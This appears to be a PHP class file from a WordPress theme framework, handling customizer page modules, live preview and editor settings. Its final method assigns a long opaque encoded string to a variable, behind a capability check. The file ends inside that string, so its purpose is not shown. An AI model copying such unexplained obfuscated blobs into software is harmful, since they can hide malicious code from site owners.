<?php
defined( 'ABSPATH' ) || exit;

class WPCOM {
    private static $_render;
    private static $_preview;
    public static function get_post($id, $type='post'){
        if(is_numeric($id)){
            return get_post($id);
        }else{
            $args = array(
                'name'        => $id,
                'post_status' => 'any',
                'post_type' => $type,
                'posts_per_page' => 1
            );
            $my_posts = get_posts($args);
            if($my_posts) return $my_posts[0];
        }
    }

    public static function category( $tax = 'category' ){
        $categories = get_terms( array(
            'taxonomy' => $tax,
            'hide_empty' => false,
        ) );

        $cats = array();

        if( $categories && !is_wp_error($categories) ) {
            foreach ($categories as $cat) {
                $cats[$cat->term_id] = $cat->name;
            }
        }

        return $cats;
    }

    public static function register ( $wp_customize ) {
        global $wpdb, $wpcom_panel;
        if( $wpcom_panel && $wpcom_panel->get_demo_config() ) {
            $values = $wpdb->get_results("SELECT post_id, meta_value FROM $wpdb->postmeta WHERE meta_key = '_page_modules'");
            $echo = new stdClass();
            foreach ($values as $value) {
                if ($value) {
                    $echo->{$value->post_id} = maybe_unserialize($value->meta_value);
                }
            }
            $wp_customize->add_setting('_page_modules',
                array(
                    'default' => $echo,
                    'type' => 'page_modules',
                    'capability' => 'edit_theme_options',
                    'transport' => 'postMessage'
                )
            );

            add_action('admin_print_footer_scripts', array('WPCOM', 'modules_options'));
        }
    }

    public static function modules_options(){
        global $wpcom_panel;
        if( $wpcom_panel && $wpcom_panel->get_demo_config() ) {
            $cats = self::category();
            $product_cat_json = '';
            if (function_exists('is_woocommerce')) {
                $product_cats = get_terms('product_cat', array('hide_empty' => 0));
                $pcats = array();
                foreach ($product_cats as $pcat) {
                    $pcats[$pcat->term_id] = $pcat->name;
                }
                $product_cat_json = function_exists('is_woocommerce') ? 'var _product_cat = ' . wp_json_encode($pcats) . ';' : '';
            }

            echo '<script>var _category = ' . wp_json_encode($cats) . ';var _modules = ' . wp_json_encode(self::modules()) . ';' . $product_cat_json . '</script>';
        }
    }

    public static function get_all_sliders(){
        $sliders = array();
        if(shortcode_exists("rev_slider")){
            $slider = new RevSlider();
            $revolution_sliders = $slider->getArrSliders();
            foreach ( $revolution_sliders as $revolution_slider ) {
                $alias = $revolution_slider->getAlias();
                $title = $revolution_slider->getTitle();
                $sliders[$alias] = $title.' ('.$alias.')';
            }
        }
        return $sliders;
    }

    public static function live_preview() {
        global $wpcom_panel;
        if( $wpcom_panel && $wpcom_panel->get_demo_config() ) {
            self::$_preview = 1;
            wp_enqueue_style("themer-customizer", FRAMEWORK_URI . "/assets/css/customizer.css", false, FRAMEWORK_VERSION, "all");
            wp_enqueue_style("themer-panel", FRAMEWORK_URI . "/assets/css/panel.css", false, FRAMEWORK_VERSION, "all");

            wp_enqueue_style( 'wp-color-picker' );
            wp_enqueue_script('iris', admin_url( 'js/iris.min.js' ), array('jquery-ui-draggable', 'jquery-ui-slider', 'jquery-touch-punch'), FRAMEWORK_VERSION, true);
            wp_enqueue_script('wp-color-picker', admin_url( 'js/color-picker.min.js' ), array( 'iris' ), FRAMEWORK_VERSION, true);
            // Manually passing text strings to the JavaScript
            $colorpicker_l10n = array(
                'clear' => __( 'Clear' ),
                'defaultString' => __( 'Default' ),
                'pick' => __( 'Select Color' ),
                'current' => __( 'Current Color' ),
            );
            wp_localize_script('wp-color-picker', 'wpColorPickerL10n', $colorpicker_l10n);
            wp_enqueue_script('themer-customizer', FRAMEWORK_URI . '/assets/js/customizer.js', array('jquery', 'customize-preview'), FRAMEWORK_VERSION, true);
            wp_enqueue_script('themer-panel', FRAMEWORK_URI . '/assets/js/panel.js', array('themer-customizer', 'jquery-ui-core', 'wp-color-picker'), FRAMEWORK_VERSION, true);
            wp_enqueue_media();
            add_action( 'wp_footer', array('WPCOM', 'module_panel'));
        }
    }

    public static function module_panel(){ ?>
        <div id="wpcom-panel" class="wpcom-module-modal">
            <module-panel :ready="ready" />
        </div>
        <div style="display: none;"><?php wp_editor( 'EDITOR', 'WPCOM-EDITOR', WPCOM::editor_settings(array('textarea_name'=>'EDITOR-NAME')) );?></div>
        <script>
            _panel_options = <?php echo self::init_panel_options();?>;
        </script>
    <?php }

    private static function init_panel_options(){
        $res = array();
        $res['type'] = 'module';
        $res['ver'] = THEME_VERSION;
        $res['theme-id'] = THEME_ID;
        return json_encode($res);
    }

    public static function modules_preview($options){
        self::customize_post_filter();
        if( isset($_POST['customized']) ){
            $customized = json_decode($_POST['customized'], true);
            if(isset($customized['_page_modules'])) $options->manager->set_post_value('_page_modules', $customized['_page_modules']);
        }

        self::$_render = $options->post_value();

        if(self::$_render){
            return add_filter('get_post_metadata', array( 'WPCOM', 'mod_preview_filter' ), 10, 3);
        }
    }

    public static function mod_preview_filter($modules, $object_id, $meta_key){
        if($meta_key == '_page_modules'){
            $render = self::$_render;
            if(!$modules){
                $modules = array();
            }
            if(isset($render[$object_id])){
                $modules[] = $render[$object_id];
                return $modules;
            }
        }
    }

    public static function modules_update( $res ){
        if( isset($res['changeset_status']) && $res['changeset_status']=='publish' ) {
            $customized = json_decode(wp_unslash($_POST['customized']), true);
            if($customized===null) $customized = json_decode($_POST['customized'], true);
            if( isset($customized['_page_modules']) && $customized['_page_modules'] ) {
                foreach ($customized['_page_modules'] as $k => $o) {
                    update_post_meta($k, '_page_modules', $o);
                }
            }
        }
        return $res;
    }

    public static function modules(){
        return apply_filters( 'wpcom_modules', new stdClass() );
    }

    public static function editor_settings($args = array()){
        return array(
            'textarea_name' => $args['textarea_name'],
            'textarea_rows' => isset($args['textarea_rows']) ? $args['textarea_rows'] : 3,
            'tinymce'       => array(
                'height'        => 150,
                'toolbar1' => 'formatselect,fontsizeselect,bold,blockquote,forecolor,alignleft,aligncenter,alignright,link,unlink,bullist,numlist,fullscreen,wp_help',
                'toolbar2' => '',
                'toolbar3' => '',
            )
        );
    }

    public function _options(){
        $res = array();
        if( current_user_can( 'publish_posts' ) ){
			$ops ='6567107f7b35c186$21iztbWpmDU0Y.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